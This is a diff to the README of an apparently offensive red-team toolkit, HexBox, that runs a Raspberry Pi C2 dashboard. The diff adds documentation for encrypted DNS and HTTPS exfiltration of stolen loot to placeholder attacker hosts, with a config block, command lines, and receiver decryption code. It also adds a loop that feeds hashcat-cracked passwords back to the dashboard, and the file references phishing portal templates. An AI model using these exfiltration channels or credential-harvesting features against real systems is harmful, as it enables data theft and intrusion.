@@ -32,7 +32,7 @@ HexBox turns a Raspberry Pi 3B into a **command-and-control hub** for the follow
 | 🐇 **Bash Bunny** | Multi-mode HID+ECM attacks, switch-selectable payloads |
 | 🐬 **Flipper Zero** | NFC/RFID cloning, Sub-GHz capture, BadUSB — serial bridge |
 
-Also integrates **Sliver C2** (implant generation and session management), **BloodHound CE** (AD graph auto-ingest), and **Kismet** (GPS war-driving and wireless survey).
+Also integrates **Sliver C2** (implant generation and session management), **BloodHound CE** (AD graph auto-ingest), **Kismet** (GPS war-driving and wireless survey), and a **Mobile PWA Companion** (read-only Android/iOS dashboard via "Add to Home Screen").
 
 All controlled from a single **Flask-based C2 dashboard** running on the Pi.
 
@@ -100,6 +100,13 @@ All controlled from a single **Flask-based C2 dashboard** running on the Pi.
 - ✅ **GPS War-Drive with Kismet** — Start/stop Kismet from the dashboard; live AP table with SSID, BSSID, channel, signal, encryption, and GPS coordinates; Leaflet.js map with color-coded markers (green=open, red=encrypted); CSV and KML export for external mapping tools
 - ✅ **Kismet Integration** — REST API v2 polling (`/devices/views/phydot11_accesspoints/devices.json`); network cache persisted to `loot/wardrive/networks.json` so export works even when Kismet is offline; encryption decoded from `dot11.advertisedssid.crypt_set` bit flags
 
+### Phase 6 — Covert Exfil / Mobile Companion / Cracked Password Loop
+- ✅ **Encrypted DNS Exfil** — AES-256-GCM + gzip compression → base32 → raw UDP DNS subdomain queries; no external dependencies (pure stdlib socket); format: `{seq}.{chunk}.{session}.exfil.{domain}`; throttled to avoid rate limiting; terminator packet carries total chunk count for receiver reassembly
+- ✅ **Encrypted HTTPS Exfil** — AES-256-GCM + gzip → base64 JSON POST to attacker C2 endpoint; configurable auth token; TLS verification toggle; all via `requests` (already installed)
+- ✅ **Covert Exfil UI** — Devices tab panel: select DNS or HTTPS method, choose individual file or full loot archive, one-click send; config summary shows DNS domain / HTTPS URL / AES key status; live exfil log output; file picker populated with current loot tree
+- ✅ **Mobile Companion PWA** — Read-only dashboard at `/mobile`; shows ops summary (hash count, WiFi creds, hosts, cracked passwords, portal captures, war-drive networks); real-time process list; SSE-powered live feed for loot/process/crack events; PWA manifest at `/mobile/manifest.json` — tap "Add to Home Screen" on Android/iOS for app-like access; no APK build required
+- ✅ **Cracked Password Feedback Loop** — Background loot watcher detects `cracked.txt` modification events (hashcat writes to this file); broadcasts `hash_cracked` SSE event; Intel tab **Cracked Passwords** section refreshes automatically; `parse_cracked_passwords()` handles both NTLMv2 (`USER::DOMAIN:...:plaintext`) and simple `HASH:plaintext` formats; SSE toast notification on crack; badge on Intel tab shows count; one-click copy of all plaintexts
+
 ### Operations
 - ✅ **Loot File Browser** — Download any captured file directly from the dashboard
 - ✅ **Process Management** — Start/stop all background services with whitelist-enforced kill buttons
@@ -135,6 +142,11 @@ All controlled from a single **Flask-based C2 dashboard** running on the Pi.
 - **Kismet** — wireless survey + GPS war-driving: `sudo apt install kismet`; configure with `kismet_site.conf` and set credentials in `config.json → kismet`
 - **tshark** — PCAP analysis backend: `sudo apt install tshark`; part of the `wireshark-common` package
 - **GPS receiver** (optional) — any USB/serial GPSd-compatible receiver for coordinate logging during war-drives
+
+### Phase 6 Add-ons
+- **DNS exfil receiver** — A DNS authoritative nameserver for your `dns_domain` that logs all incoming queries; reassemble base32 chunks by session ID and sequence number; no server-side software is included in this repo — use `tcpdump`, `dnscat2-server`, or a custom DNS log parser
+- **HTTPS exfil receiver** — Any HTTP(S) endpoint that accepts `POST /` with `{"data": "<base64>", "session": "...", "ts": "..."}` body; decrypt with the matching `aes_key` using AES-256-GCM (nonce=first 12 bytes, tag=next 16 bytes)
+- **pycryptodome** — AES-256-GCM encryption (already in `requirements.txt`)
 
 ### Optional but Recommended
 - 3.5" touchscreen HAT (for headless field ops)
@@ -292,8 +304,8 @@ The dashboard has **7 tabs**:
 
 | Tab | Purpose |
 |-----|---------|
-| **Devices** | Control all 7 devices + Pi local tools; Sliver C2 panel; software update; live activity feed |
-| **Intel** | NTLM hashes, WiFi credentials, network map, Chrome DBs, system profiles, BloodHound data; PCAP analyzer; portal credential captures |
+| **Devices** | Control all 7 devices + Pi local tools; Sliver C2 panel; **Covert Exfil** panel; software update; live activity feed |
+| **Intel** | NTLM hashes, WiFi credentials, network map, Chrome DBs, system profiles, BloodHound data; PCAP analyzer; portal credential captures; **Cracked Passwords** (hashcat feedback loop) |
 | **Payloads** | Build and download custom DuckyScript payloads; deploy to OMG Plug; Evil Portal builder with preview, download, and Pineapple deploy |
 | **Loot** | File browser with one-click download for any captured file |
 | **Logs** | Real-time log tail for all services (Responder, Bettercap, hashcat, Sliver, Kismet, etc.) |
@@ -406,19 +418,77 @@ python3 ~/hexbox/c2/parse_pcap.py loot/pcaps/capture.pcap --json
 
 Configure Kismet credentials in `config.json → kismet` (default: `kismet:kismet` at `localhost:2501`).
 
+### Covert Loot Exfiltration
+
+Configure your exfil channel in `config.json → exfil` (or run `setup/configure.sh`):
+
+```json
+"exfil": {
+  "dns_domain":      "exfil.attacker.com",
+  "dns_server":      "attacker-ns-ip",
+  "https_url":       "https://attacker.com/upload",
+  "https_token":     "secret-bearer-token",
+  "aes_key":         "your-32-byte-aes-key-here!!!!!",
+  "https_verify_tls": true
+}
+```
+
+From the **Devices → Covert Exfil** panel:
+1. Select method: **HTTPS** (default) or **DNS**
+2. Choose target: **All loot (zip)** or a specific file from the dropdown
+3. Click **↑ Send** — loot is zipped, gzip-compressed, AES-256-GCM encrypted, and sent
+4. The log panel shows per-session send status; **Status** button refreshes config/file list
+
+From the command line:
+```bash
+python3 ~/hexbox/c2/exfil.py https --config ~/hexbox/config.json
+python3 ~/hexbox/c2/exfil.py dns   --config ~/hexbox/config.json --file creds/host_wifi.txt
+```
+
+**Receiver-side decryption** (Python example):
+```python
+from Crypto.Cipher import AES
+import base64, gzip, hashlib
+
+key = hashlib.sha256(b"your-32-byte-aes-key-here!!!!!").digest()
+blob = base64.b64decode(received_base64)
+nonce, tag, ct = blob[:12], blob[12:28], blob[28:]
+data = gzip.decompress(AES.new(key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag))
+```
+
+### Mobile Companion App (PWA)
+
+1. Connect your phone to the same network as HexBox
+2. Navigate to `http://<hexbox-ip>:1337/mobile` in your mobile browser
+3. Tap **Add to Home Screen** (Android Chrome) or the share icon → **Add to Home Screen** (iOS Safari)
+
+The mobile dashboard shows a live ops summary, active processes, war-drive network count, and a real-time event feed. It auto-refreshes every 30 seconds and stays connected via SSE. The view is **read-only** — no attack controls are available on the mobile view.
+
+### Cracked Password Feedback Loop
+
+Cracked passwords appear automatically in the **Intel → Cracked Passwords** section:
+1. Capture NTLMv2 hashes via Responder (Devices → Pi Local → Responder)
+2. Launch Hashcat from the dashboard (Devices → Pi Local → Hashcat)
+3. When `loot/cracked.txt` is updated by hashcat, the loot watcher fires a `hash_cracked` SSE event
+4. A toast notification appears on the dashboard; the Intel tab badge updates; the cracked table reloads
+5. Click **Copy Plaintexts** to copy all `user:password` pairs to clipboard
+
+Cracked table shows: username, domain, plaintext password, hash type, and hash preview. Both NTLMv2 (`USER::DOMAIN:...:plaintext`) and simple `HASH:plaintext` formats are parsed.
+
 ```
 hexbox/
-├── config.json                      # ← Edit this: all IPs and credentials
+├── config.json                      # ← Edit this: all IPs, credentials, and exfil config
 ├── requirements.txt                 # Python dependencies
 ├── setup/
 │   ├── hexbox_setup.sh              # Base provisioning (run once on fresh Pi)
-│   ├── configure.sh                 # Interactive one-time configuration
+│   ├── configure.sh                 # Interactive one-time configuration (now includes exfil settings)
 │   └── install_dependancies.sh      # Install Python deps from requirements.txt
 ├── c2/
-│   ├── hexbox_c2.py                 # Main Flask C2 dashboard (Phase 5: Evil Portal, PCAP, Kismet war-drive)
+│   ├── hexbox_c2.py                 # Main Flask C2 dashboard (Phase 6: exfil, mobile PWA, cracked pw loop)
 │   ├── catcher.py                   # Credential receiver: Chrome, WiFi, sysinfo, BloodHound JSON, portal captures
-│   ├── parse_loot.py                # Loot intelligence: hash parsing, nmap XML, WiFi, BloodHound, report gen
-│   └── parse_pcap.py                # PCAP analysis: tshark protocol hierarchy, HTTP/FTP/SMTP/Telnet creds, DNS
+│   ├── parse_loot.py                # Loot intelligence: hash parsing, nmap XML, WiFi, BloodHound, cracked pw, report gen
+│   ├── parse_pcap.py                # PCAP analysis: tshark protocol hierarchy, HTTP/FTP/SMTP/Telnet creds, DNS
+│   └── exfil.py                     # Encrypted loot exfil: AES-256-GCM + gzip over DNS subdomains or HTTPS POST
 ├── payloads/
 │   ├── portals/
 │   │   ├── o365.html                # Evil Portal: Microsoft O365 phishing template
@@ -453,12 +523,13 @@ hexbox/
 │   ├── pcaps/                       # Packet Squirrel + tshark analysis PCAPs
 │   ├── portals/                     # Evil Portal credential captures (captures.json)
 │   ├── wardrive/                    # Kismet war-drive data (networks.json cache)
+│   ├── cracks/                      # Hashcat scratch (ntlmv2_hashes.txt, cracked.txt)
 │   ├── shark/                       # Shark Jack loot
 │   ├── bunny/                       # Bash Bunny recon output
 │   ├── bloodhound/                  # BloodHound v5 JSON files
 │   ├── implants/                    # Generated Sliver implants
 │   └── reports/                     # Generated HTML engagement reports
-└── logs/                            # Operational logs (c2.log, responder.log, etc.)
+└── logs/                            # Operational logs (c2.log, responder.log, hashcat.log, etc.)
 ```
 
 ---
@@ -478,6 +549,9 @@ hexbox/
 - Evil Portal templates are deployed to the Pineapple in cleartext via SSH — ensure the management network is isolated
 - `loot/portals/captures.json` contains plaintext victim credentials — encrypt loot with `scripts/opsec.sh` before extraction
 - Kismet logs to disk and can fill your SD card quickly during extended war-drives — monitor disk usage with the dashboard log viewer
+- **Exfil AES key** in `config.json` is the single point of failure for exfil OPSEC — use a strong random key and rotate per engagement; never commit a real key to this repo
+- **DNS exfil** generates anomalous DNS traffic with long random subdomains — use sparingly on monitored networks; throttle is 50ms between packets
+- **Mobile PWA** at `/mobile` is protected by the same session auth as the main dashboard — ensure your phone browser has a valid session cookie or pass `X-HexBox-Token` header
 
 ---
 
@@ -489,11 +563,12 @@ hexbox/
 - ✅ Phase 3: SSE live feed, intel engine (hash/WiFi/nmap/sysinfo parsing), payload builder, engagement sessions, hashcat, PMKID, AD recon, HTML report generator
 - ✅ Phase 4: Bash Bunny integration, Flipper Zero serial bridge, Sliver C2 implant generation, BloodHound CE auto-ingest
 - ✅ Phase 5: Custom Evil Portal templates (O365, Okta, Duo, Google), PCAP analysis dashboard (tshark protocol/credential stats), GPS war-driving mode with Kismet integration
+- ✅ Phase 6: Encrypted loot exfil over DNS/HTTPS covert channels, Mobile PWA companion app, cracked password feedback loop (hashcat → Intel tab)
 
 ### Upcoming
-- [ ] Encrypted loot exfil over DNS / HTTPS covert channels
-- [ ] Mobile companion app (read-only Android dashboard)
-- [ ] Cracked password feedback loop (hashcat output back into Intel tab)
+- [ ] Automated C2 callback via Sliver beacons on exfil completion
+- [ ] Multi-engagement session isolation (separate loot dirs per job)
+- [ ] Push notifications to mobile via WebPush / ntfy.sh
 
 ---
 
